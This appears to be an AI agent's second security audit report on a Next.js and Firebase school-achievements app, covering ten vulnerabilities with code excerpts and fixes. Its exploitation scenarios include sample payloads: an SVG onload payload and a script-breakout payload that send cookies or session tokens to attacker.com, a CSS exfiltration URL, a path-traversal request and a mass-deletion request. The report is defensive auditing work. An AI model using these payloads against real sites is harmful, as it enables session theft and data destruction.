# 🛡️ School-Achievements: Comprehensive Second Security & Attack Audit Report

**Audit Type:** Full Application Deep-Dive & Hacker Injection/Attack Vector Analysis (Second Audit)  
**Date:** October 16, 2026  
**Target Environment:** Next.js 16 (App Router / Turbopack), Firebase Firestore (Admin & Client SDK), Cloudinary, Vercel Serverless  
**Auditor:** Antigravity Senior Security Agent & Codebase Auditor  
**Audit Scope:** All API Routes, Frontend Components, Firestore & Storage Rules, Authentication & Session Models, Data Sanitization, Cryptographic Primitives, Export Engines, and Serverless Execution Lifecycles.

---

## 1. Executive Summary & Threat Landscape

Following our initial review and atomic upload implementation, this **Second Comprehensive Audit** performed a line-by-line inspection of the entire codebase, specifically focusing on **hacker exploitation vectors, injection surfaces, authentication flaws, and client-side bypasses**.

While the atomic upload flow and signed JWT session token have hardened the initial attack surface, multiple **high-impact vulnerabilities** and **architectural blind spots** remain in the application layer and database access rules:

| Severity | Category | Vulnerability | Exploitation Potential |
|---|---|---|---|
| **CRITICAL (P0)** | Storage / Integrity | **Arbitrary Cloudinary Asset Purge via Rollback Endpoint** | Any visitor can delete any file on Cloudinary (including school logos and existing approved achievements). |
| **CRITICAL (P0)** | Data Leakage / Rules | **Global Exposure of Teacher PIN Hashes & Unapproved Achievements** | Direct client Firestore queries download all documents including `pinHash` and rejected submissions. |
| **CRITICAL (P0)** | Path Traversal | **Firestore Document ID Path Traversal / Parameter Injection** | Unsanitized `params.id` in `achievements/[id]` allows navigating Firestore document paths. |
| **HIGH (P1)** | Cross-Site Scripting | **MIME-Type Spoofing for Stored XSS / Malicious File Hosting** | Server trusts client-controlled `file.type` in `/api/upload` without inspecting file magic bytes. |
| **HIGH (P1)** | Cross-Site Scripting | **JSON-LD Script Breakout / DOM XSS via School Settings** | `JSON.stringify(jsonLd)` in `page.tsx` does not escape `</script>` tags in `schoolName`. |
| **HIGH (P1)** | CSRF / Origin Bypass | **Origin Validation Substring Bypass Vulnerability** | `origin.includes(host)` can be bypassed using subdomains (`victim.com.attacker.com`). |
| **HIGH (P1)** | Auth / Tampering | **Client-Side Admin Privilege Escalation via LocalStorage Fallback** | Blocking `/api/auth` falls back to `localStorage.getItem('isAdmin') === 'true'`. |
| **HIGH (P1)** | Cryptography | **4-Digit PIN Offline Cracking & Brute Force Attacks** | Low PBKDF2 iterations (10k), static admin salt, and non-constant time comparison (`===`). |
| **MEDIUM (P2)** | CSV / Formula | **Legacy Excel Formula Injection at Export Boundary** | Database fields exported in `full-record` without runtime sanitization at the export boundary. |
| **MEDIUM (P2)** | CSS Injection | **Style Injection in Print-to-PDF Engine** | Unsanitized `cell.color` inserted directly into HTML `style=""` in `printPdf.ts`. |
| **MEDIUM (P2)** | Denial of Service | **Single-Slot Concurrency Race in Admin Password Reset** | Static Firestore document `admin/pinReset` causes race conditions and reset denial of service. |
| **MEDIUM (P2)** | Architecture | **Serverless In-Memory Rate Limiting & Logger Eviction** | In-memory `Map` and `setInterval` logger fail on Vercel distributed lambdas. |

---

## 2. Special Audit: Deep-Dive Hacker Injections & Attack Vectors

---

### 🚨 Vector 1: Arbitrary Cloudinary Asset Destruction via `/api/cleanup` Rollback

- **Affected File:** [`src/app/api/cleanup/route.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/api/cleanup/route.ts#L40-L50)
- **Attack Category:** Unauthorized Storage Destruction / Insecure Direct Object Reference (IDOR)
- **CWE:** CWE-284 (Improper Access Control), CWE-862 (Missing Authorization)

#### Technical Mechanism:
In `src/app/api/cleanup/route.ts`, the `rollback` action is executed before the admin authentication check:
```typescript
if (action === 'rollback') {
  const urls = Array.isArray(body.urls) ? (body.urls as string[]) : [];
  if (urls.length === 0) return NextResponse.json({ ok: true, deletedCount: 0 });

  const validUrls = urls.filter((u: any) => typeof u === 'string' && u.includes('cloudinary.com'));
  const results = await Promise.allSettled(validUrls.map(destroyCloudinaryAsset));
  const deletedCount = results.filter(r => r.status === 'fulfilled' && (r.value as any)?.ok).length;
  return NextResponse.json({ ok: true, deletedCount });
}
```
The server checks only that the string contains `cloudinary.com`. It **never checks**:
1. Whether the file belongs to an active, uncommitted upload session.
2. Whether the URL is referenced in the school settings (e.g., `logoUrl`).
3. Whether the URL is an attachment on an approved, historical achievement.

#### Hacker Exploitation Scenario:
1. An attacker scrapes the homepage or runs a query against `achievements` to collect all public attachment URLs.
2. The attacker sends a simple HTTP POST request:
   ```json
   POST /api/cleanup
   Content-Type: application/json

   {
     "action": "rollback",
     "urls": [
       "https://res.cloudinary.com/.../school_logo.png",
       "https://res.cloudinary.com/.../annual_awards.pdf",
       "https://res.cloudinary.com/.../teacher_achievement_01.jpg"
     ]
   }
   ```
3. The server immediately invokes `destroyCloudinaryAsset` on each URL using the server's master API credentials (`CLOUDINARY_API_KEY` + `CLOUDINARY_API_SECRET`).
4. **Impact:** Permanent loss of all Cloudinary media and documents across the entire organization without requiring any credentials.

#### Defensive Remediation:
- Protect `rollback` using a short-lived cryptographic upload token issued by `/api/upload` (e.g., HMAC-signed token containing `publicId` and an expiry timestamp of 5 minutes).
- Or verify that the URL is not currently stored in any Firestore document (`achievements` or `settings`) before allowing destruction.

---

### 🚨 Vector 2: Firestore Document ID Path Traversal / Parameter Injection

- **Affected File:** [`src/app/api/achievements/[id]/route.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/api/achievements/%5Bid%5D/route.ts#L28-L45) & [`src/lib/firebase-admin.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/lib/firebase-admin.ts#L35-L37)
- **Attack Category:** Path Traversal / Document Identifier Injection
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

#### Technical Mechanism:
In `src/lib/firebase-admin.ts`:
```typescript
export function doc(db: any, ...pathSegments: string[]) {
  return getDb().doc(pathSegments.join('/'));
}
```
In `src/app/api/achievements/[id]/route.ts`:
```typescript
export async function PUT(request: Request, { params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;
  ...
  const docSnap = await getDoc(doc(db, 'achievements', id));
```
Because `pathSegments.join('/')` concatenates `'achievements'` and `id`, if `id` contains slashes (`/`) or relative path escape sequences (`..`), Firestore resolves the path relative to the root:
```
'achievements' + '/' + '../admin/pinConfig' => 'admin/pinConfig'
```

#### Hacker Exploitation Scenario:
An attacker issues:
```http
PUT /api/achievements/..%2Fadmin%2FpinConfig HTTP/1.1
Content-Type: application/json

{
  "pin": "1234",
  "pinHash": "forged_hash"
}
```
If not sanitized, this directs the Firestore pointer into the protected `admin/` collection, allowing unauthorized modification or deletion attempts on internal system documents.

#### Defensive Remediation:
Enforce strict document ID validation in all dynamic route handlers:
```typescript
if (!id || typeof id !== 'string' || !/^[a-zA-Z0-9_-]{1,64}$/.test(id)) {
  return NextResponse.json({ error: 'Invalid document ID format' }, { status: 400 });
}
```

---

### 🚨 Vector 3: Stored Cross-Site Scripting (XSS) via MIME-Type Spoofing in `/api/upload`

- **Affected File:** [`src/app/api/upload/route.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/api/upload/route.ts#L54-L60)
- **Attack Category:** Stored XSS / Malicious File Upload
- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-79 (Cross-Site Scripting)

#### Technical Mechanism:
In `src/app/api/upload/route.ts`:
```typescript
// Validate file type server-side
if (!ALLOWED_MIME_TYPES.includes(file.type)) {
  return NextResponse.json({ error: 'نوع الملف غير مدعوم' }, { status: 400 });
}
```
`file.type` is populated directly from the client's HTTP request header (`Content-Type: ...`). The server performs **zero magic-byte inspection** of the file buffer.

#### Hacker Exploitation Scenario:
1. An attacker prepares a file containing malicious JavaScript, SVG payloads, or active HTML content:
   ```html
   <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('/api/auth').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?c='+document.cookie))">
   </svg>
   ```
2. The attacker names the file `document.svg` or `invoice.html` and uploads it via `/api/upload` setting:
   `Content-Type: application/pdf` or `image/png`.
3. The server checks `ALLOWED_MIME_TYPES.includes("image/png")` -> **PASSES**.
4. The file is uploaded to Cloudinary under `/auto/upload`.
5. Cloudinary detects the raw SVG/HTML content.
6. When an administrator or teacher clicks to view the attachment on `/achievement/[id]`, the browser renders the payload inside the origin context or Cloudinary domain, executing the attacker's script.

#### Defensive Remediation:
1. Verify file signatures (magic bytes) on the server using `file-type` or inspection of the initial buffer bytes before uploading.
2. In `getDownloadUrl()` in [`src/app/achievement/[id]/page.tsx`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/achievement/%5Bid%5D/page.tsx#L47-L54), always enforce `fl_attachment` to prevent inline execution of SVG/HTML files.
3. Explicitly disallow SVG files or upload them strictly with `resource_type: "raw"`.

---

### 🚨 Vector 4: JSON-LD Script Breakout / DOM XSS in `src/app/page.tsx`

- **Affected File:** [`src/app/page.tsx`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/page.tsx#L123-L136)
- **Attack Category:** DOM / Stored Cross-Site Scripting
- **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

#### Technical Mechanism:
In `src/app/page.tsx`:
```tsx
const jsonLd = {
  '@context': 'https://schema.org',
  '@type': 'EducationalOrganization',
  name: schoolSettings?.schoolName || 'المدرسة',
  description: 'منصة عرض إنجازات الطلاب والأنشطة المدرسية.',
  url: 'https://school-achievements-six.vercel.app',
};

return (
  <>
    <script
      type="application/ld+json"
      dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
    />
```
Standard `JSON.stringify()` **does NOT escape `<` or `>` characters or `</script>` strings**.

#### Hacker Exploitation Scenario:
1. An attacker who updates settings (or injects data into `settings/global_info`) sets `schoolName` to:
   ```html
   </script><script>fetch('https://attacker.com/exfil?k='+localStorage.getItem('admin_session'))</script>
   ```
2. When any user visits the home page (`/`), the browser parser parses HTML sequentially.
3. When it sees `</script>`, it immediately closes the `<script type="application/ld+json">` tag, and treats `<script>fetch(...)</script>` as active JavaScript, executing it in the victim's session.

#### Defensive Remediation:
Sanitize serialized JSON before rendering:
```tsx
dangerouslySetInnerHTML={{
  __html: JSON.stringify(jsonLd).replace(/</g, '\\u003c')
}}
```

---

### 🚨 Vector 5: Origin Validation Substring Bypass Vulnerability

- **Affected Files:**
  - [`src/app/api/achievements/route.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/api/achievements/route.ts#L33-L40)
  - [`src/app/api/settings/route.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/api/settings/route.ts#L44-L49)
  - [`src/app/api/pin/route.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/api/pin/route.ts#L32-L37)
- **Attack Category:** Cross-Site Request Forgery (CSRF) / Origin Spoofing
- **CWE:** CWE-346 (Origin Validation Error)

#### Technical Mechanism:
The CSRF check in multiple routes relies on:
```typescript
const origin = request.headers.get('origin');
const host = request.headers.get('host');
if (origin && host && !origin.includes(host)) {
  return NextResponse.json({ error: 'Invalid origin' }, { status: 403 });
}
```
`origin.includes(host)` checks if `host` is a **substring** of `origin`.

#### Hacker Exploitation Scenario:
1. The legitimate host is `school-achievements.vercel.app`.
2. An attacker registers the domain:
   `school-achievements.vercel.app.attacker-domain.com`
3. When an admin or user visits the attacker's site, a cross-origin request is dispatched to `/api/settings` or `/api/achievements`.
4. The server checks:
   ```typescript
   "https://school-achievements.vercel.app.attacker-domain.com".includes("school-achievements.vercel.app")
   ```
   This returns **`true`**! The CSRF protection is completely bypassed.

#### Defensive Remediation:
Parse the URL and compare the exact hostname:
```typescript
function isValidOrigin(originHeader: string | null, hostHeader: string | null): boolean {
  if (!originHeader || !hostHeader) return true;
  try {
    const originHost = new URL(originHeader).host;
    return originHost === hostHeader;
  } catch {
    return false;
  }
}
```

---

### 🚨 Vector 6: Client-Side Admin State Tampering via LocalStorage Fallback

- **Affected File:** [`src/lib/useAdmin.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/lib/useAdmin.ts#L26-L29)
- **Attack Category:** Client-Side Authorization Bypass
- **CWE:** CWE-602 (Client-Side Enforcement of Server-Side Security)

#### Technical Mechanism:
In `src/lib/useAdmin.ts`:
```typescript
const checkAdmin = useCallback(async () => {
  try {
    const res = await fetch('/api/auth');
    const data = await res.json();
    ...
  } catch {
    // Fallback to localStorage if API is unavailable
    setIsAdmin(localStorage.getItem('isAdmin') === 'true');
  }
}, []);
```

#### Hacker Exploitation Scenario:
1. Any user opens their browser console on any page.
2. The user runs:
   ```javascript
   localStorage.setItem('isAdmin', 'true');
   ```
3. The user blocks requests to `/api/auth` (e.g., using browser network request blocking or simulating an offline state).
4. The `fetch('/api/auth')` fails into the `catch` block.
5. `useAdmin` sets `isAdmin = true`.
6. **Result:** The user interface displays all admin management bars, scoring controls, settings panels, delete buttons, and admin routes.

#### Defensive Remediation:
Never fall back to unverified `localStorage` for administrative authority:
```typescript
} catch {
  setIsAdmin(false);
}
```

---

### 🚨 Vector 7: Cryptographic Timing Attacks on PIN & Token Comparisons

- **Affected Files:**
  - [`src/app/api/pin/route.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/api/pin/route.ts#L105) (`inputHash === storedHash`)
  - [`src/app/api/pin/reset/confirm/route.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/api/pin/reset/confirm/route.ts#L42) (`storedHash === tokenHash`)
  - [`src/app/api/cron/weekly-backup/route.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/api/cron/weekly-backup/route.ts#L17) (`authHeader === ...`)
- **Attack Category:** Side-Channel Information Leak / Timing Attack
- **CWE:** CWE-208 (Observable Timing Discrepancy)

#### Technical Mechanism:
Standard JavaScript equality (`===`) short-circuits on the first mismatched character. An attacker measuring request latencies across thousands of requests can determine how many leading characters of a hash match.

#### Defensive Remediation:
Use Node's built-in constant-time comparison:
```typescript
import { timingSafeEqual } from 'crypto';

function secureCompare(a: string, b: string): boolean {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  const bufA = Buffer.from(a);
  const bufB = Buffer.from(b);
  if (bufA.length !== bufB.length) return false;
  return timingSafeEqual(bufA, bufB);
}
```

---

### 🚨 Vector 8: Excel Formula Injection at the Export Boundary

- **Affected File:** [`src/app/full-record/page.tsx`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/full-record/page.tsx#L210-L235)
- **Attack Category:** CSV / Formula Injection (CSV Injection)
- **CWE:** CWE-1236 (Improper Neutralization of Formula Elements in CSV File)

#### Technical Mechanism:
While new achievements are sanitized before saving to Firestore, `exportToExcel` in `src/app/full-record/page.tsx` places data directly from Firestore into the sheet:
```typescript
const rows = sortedData.map(row => ({
  'المعلمة': row.teacherName || '',
  'القسم': row.department || '',
  'الإنجاز': row.title || '',
  'التاريخ': row.date || '',
  'التقييم': getScoreCategory(row.score),
  'المرفقات': attachmentsText,
}));
const ws = XLSX.utils.json_to_sheet(rows);
```
If historical/legacy achievements in the database contain strings starting with `=`, `+`, `-`, or `@`, or if an attacker injected an achievement before sanitization, opening the exported Excel file executes external programs or exfiltrates data via DDE / formula commands.

#### Defensive Remediation:
Sanitize every string field at the export boundary before passing it to `json_to_sheet`:
```typescript
import { preventExcelFormula } from '../../lib/sanitize';

'الإنجاز': preventExcelFormula(row.title || ''),
'المعلمة': preventExcelFormula(row.teacherName || ''),
```

---

### 🚨 Vector 9: CSS / Style Injection in Print Report Engine

- **Affected File:** [`src/lib/printPdf.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/lib/printPdf.ts#L107)
- **Attack Category:** CSS Injection / Style Attribute Breakout
- **CWE:** CWE-74 (Improper Neutralization of Special Elements in Output)

#### Technical Mechanism:
In `src/lib/printPdf.ts`:
```typescript
if (cell.color) style.push(`color:${cell.color}`);
const attr = style.length ? ` style="${style.join(";")}"` : "";
return `<td class="cell-text"${attr}>${escapeHtml(cell.text)}</td>`;
```
`cell.color` is inserted into `style=""` **without escaping quotes or validating hex/RGB formats**.

#### Hacker Exploitation Scenario:
If `cell.color` is user-influenced or set to:
`red" onmouseover="alert(1)" data-foo="` or `red; background-image: url('//attacker.com/leak')`, an attacker can break out of the style attribute or perform external resource exfiltration when generating print reports.

#### Defensive Remediation:
Validate `cell.color` against a strict regex before inserting:
```typescript
if (cell.color && /^#[0-9a-fA-F]{3,8}$|^[a-zA-Z]+$/.test(cell.color)) {
  style.push(`color:${cell.color}`);
}
```

---

### 🚨 Vector 10: Denial of Service & Race Condition in Admin PIN Reset

- **Affected Files:**
  - [`src/app/api/pin/reset/route.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/api/pin/reset/route.ts#L50-L56)
  - [`src/app/api/pin/reset/confirm/route.ts`](file:///c:/Users/ahmed/Desktop/School-Achievements/src/app/api/pin/reset/confirm/route.ts#L32)
- **Attack Category:** Race Condition / Denial of Service (DoS)
- **CWE:** CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)

#### Technical Mechanism:
The PIN reset flow writes all reset requests to a single static document ID:
```typescript
await setDoc(doc(db, "admin", "pinReset"), {
  tokenHash,
  email: adminEmail,
  expiresAt,
  used: false,
  createdAt: Date.now(),
});
```

#### Hacker Exploitation Scenario:
1. The genuine administrator requests a password reset. A valid email is dispatched with Token A.
2. An attacker (or a repeated script) immediately sends another `POST /api/pin/reset` with the admin email.
3. The server overwrites `admin/pinReset` with Token B.
4. When the admin clicks the email link with Token A, it fails (`"رمز غير صالح أو منتهي الصلاحية"`).
5. The administrator is effectively locked out of recovering their administrative PIN.

#### Defensive Remediation:
Index reset tokens by their individual hash (`doc(db, "admin/pinResets", tokenHash)`) rather than a single static document.

---

## 3. Firestore Security Rules Red Team Audit

*Audited using the **firebase-security-rules-auditor** standard checklist and scoring framework.*

### Active Security Rules in `firestore.rules`:
```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    // Achievements: public read, admin-only write
    match /achievements/{achievementId} {
      allow read: if true;
      allow write: if false;
    }

    // Settings: public read (except adminPin), admin-only write
    match /settings/{docId} {
      allow read: if true;
      allow write: if false;
    }

    // Admin config: no direct access at all
    match /admin/{docId} {
      allow read, write: if false;
    }

    // Default deny everything else
    match /{document=**} {
      allow read, write: if false;
    }
  }
}
```

### Formal Assessment & Score: **Score 1 / 5 (CRITICAL)**

```json
{
  "score": 1,
  "summary": "CRITICAL RISK: Complete public read access on achievements exposes sensitive teacher pinHash fields, pending unapproved submissions, and private admin scoring to unauthenticated clients over the wire. Settings read exposes admin email and teacher directories.",
  "findings": [
    {
      "check": "PII & Sensitive Field Exposure",
      "severity": "critical",
      "issue": "Public allow read: if true on /achievements allows any anonymous user to download every document containing pinHash (PBKDF2 hash of 4-digit PIN) and internal admin evaluation scores.",
      "recommendation": "Restrict read access to resource.data.status == 'approved', and isolate pinHash into a subcollection (e.g., admin/pins/{id}) inaccessible to public clients."
    },
    {
      "check": "Data Privacy & Governance",
      "severity": "major",
      "issue": "Public allow read: if true on /settings allows anonymous visitors to scrape full teacher rosters, departments, phone numbers, and administrative contact emails.",
      "recommendation": "Separate public school settings (name, logo) from administrative configuration (adminEmail, phone, staff details) into distinct Firestore documents."
    },
    {
      "check": "Client-Side Authorization Mirage",
      "severity": "major",
      "issue": "The frontend relies on JavaScript .filter(a => a.status === 'approved') in client memory. All data packets are already transmitted over the wire to unauthenticated visitors.",
      "recommendation": "Enforce status filtering in the security rules so rejected and pending achievements cannot be queried by unauthorized visitors."
    }
  ]
}
```

---

## 4. Prioritized Defensive Remediation Plan

To eliminate all identified vulnerabilities, apply the following patches across the designated files:

### Priority 0: Critical Fixes (Immediate)

1. **Lock Down `/api/cleanup` Rollback (`src/app/api/cleanup/route.ts`):**
   - Require a signed, single-use rollback token generated during `/api/upload`, or verify against Firestore that the URL is not associated with any existing document before deletion.
2. **Sanitize Dynamic Route Parameters (`src/app/api/achievements/[id]/route.ts`):**
   - Validate `id` against `^[a-zA-Z0-9_-]{1,64}$` to prevent Firestore document path traversal.
3. **Isolate `pinHash` from Public Achievements (`firestore.rules` & `api/achievements`):**
   - Move `pinHash` to a server-only location (`admin/achievementPins/{id}`) so it is never returned to frontend clients.
   - Update Firestore rules to permit reading achievements only if `resource.data.status == 'approved'`.

### Priority 1: High Severity Fixes

4. **Verify Upload Magic Bytes (`src/app/api/upload/route.ts`):**
   - Check file magic numbers for images and PDFs; do not trust client `Content-Type`.
5. **Escape JSON-LD in `src/app/page.tsx`:**
   - Replace `<` with `\u003c` in serialized JSON to prevent script tag injection.
6. **Strict Hostname CSRF Validation:**
   - Parse `new URL(origin).host === host` instead of `origin.includes(host)`.
7. **Remove Insecure LocalStorage Fallback (`src/lib/useAdmin.ts`):**
   - If `/api/auth` fails, strictly set `isAdmin = false`.
8. **Constant-Time Cryptographic Comparison:**
   - Use `crypto.timingSafeEqual` for all PIN and token hashes.

### Priority 2: Medium Severity Fixes

9. **Export Boundary Formula Sanitization (`src/app/full-record/page.tsx`):**
   - Apply `preventExcelFormula` to all string columns before passing to `XLSX.utils.json_to_sheet`.
10. **CSS Color Sanitization (`src/lib/printPdf.ts`):**
    - Validate `cell.color` using hex/color name regular expressions.
11. **Token-Indexed Password Resets (`src/app/api/pin/reset/route.ts`):**
    - Store resets in `admin/pinResets/{tokenHash}` to avoid race conditions.

---

*Report generated and delivered to the workspace as `AUDIT_REPORT_V2.md`. No existing application code was altered and no git commits or pushes have been executed.*
